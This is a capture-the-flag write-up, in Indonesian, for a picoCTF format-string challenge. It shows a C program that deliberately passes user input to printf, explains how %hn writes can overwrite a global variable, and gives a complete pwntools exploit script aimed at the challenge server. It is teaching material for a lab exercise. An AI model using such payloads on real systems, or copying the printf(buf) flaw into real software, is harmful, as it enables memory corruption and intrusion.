# Format-string-2
## Problem
```
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```
Program meminta kita untuk mengubah nilai global variable sus menjadi hex 0x67616c66
## Arbitary writes
* Kita bisa mengeksploitasi printf(buf) untuk mengubah sus menjadi nilai apapun yang kita inginkan
* untuk melakukan demikian kurang lebih apa yang kita harus masukkan ke buf ialah sebagai berikut:[padding][offset][address]\
urutannya tidak begitu penting, hanya saja jika kita ingin mengubah urutan, maka offset akan berubah, dan jika address terdapat null bytes maka akan lebih baik untuk menyimpannya di akhir
* [offset] berisi string f"%{offset}${n|hn|hhn}"
* [padding] berisi string f"%{numBytes}c"
* [address] berisi bytes little endian address yang dituju
* Gabungan string tersebut akan mengubah nilai address yang dituju dengan banyaknya nilai numBytes
* Akan tetapi, nilai untuk print karakter sebanyak 0x67616c66 sangatlah tidak praktikal, sehingga kita bisa potong menjadi 2 bagian, yaitu 0x6761 dan 0x6c66
* Karena terdapat dua bagian, maka anatomy payload akan menjadi: [padding_1][offset_1][padding_2][offset_2][aligner][addr_1][addr_2]
* Perlu diketahui bahwa pada pengubahan nilai untuk [addr_2] adalah nilai numBytes di [padding_1] dan [padding_2]
* dan juga harus ada [aligner] ditakutkan hasil tumpukan [offset_1][padding_2][offset_2][aligner] tidak membuat kelipatan yang diinginkan (8 untuk 64-bit dan 4 untuk 32-bit)

## Dekitahui
Anatomy payload pada kasus ini lebih jelas sebagai berikut
|Offset| Label |Isi |
|:--:  |:--: |:--:|
|+0|[padding_1]|%26465c|
|+8|[offset_1]|%19$hn|
|+16|[padding_2]|%1285c|
|+22|[offset_2]|%18$hn|
|+28|[alligner]| ____ |
|+32|[addr_1]| p64(elf.sym[sus]) |
|+40|[addr_1]| p64(elf.sym[sus] + 2) |

## Payload
```
#!/usr/bin/python

from pwn import *

SERVER = 'rhea.picoctf.net'
PORT = 51904

exe = context.binary = ELF('./vuln', checksec=False)

target = exe.sym['sus']
goal_value = 0x67616c66
offset = 14

upper_val = (goal_value >> 16) & 0xFFFF
lower_val = (goal_value) & 0xFFFF

upper_address = p64(target+2)
lower_address = p64(target)

payload = b''
payload += f'%{(upper_val)}c'.encode()
payload += f'%{offset+5}$hn'.encode()
payload += f'%{lower_val - upper_val}c'.encode()
payload += f'%{offset+4}$hn'.encode()

payload += (8 - (len(payload) % 8)) * b'X'

payload += lower_address
payload += upper_address

#p = process('./vuln')
p = remote(SERVER, PORT)

p.sendline(payload)

print(f"\n{p.recvline()}\n{p.recvline()}\n{p.recvline()}\n{p.recvline()}")
```